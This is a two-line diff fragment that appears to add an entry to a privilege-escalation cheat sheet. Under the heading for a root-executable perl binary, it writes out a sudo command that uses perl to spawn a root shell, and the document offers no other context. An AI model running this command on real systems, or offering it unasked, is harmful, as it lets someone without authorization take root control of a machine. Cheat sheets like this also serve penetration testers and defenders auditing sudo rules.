@@ -1,0 +1,2 @@
+### If /usr/bin/perl is executable as root:
+sudo /usr/bin/perl -e 'exec "/bin/sh"'
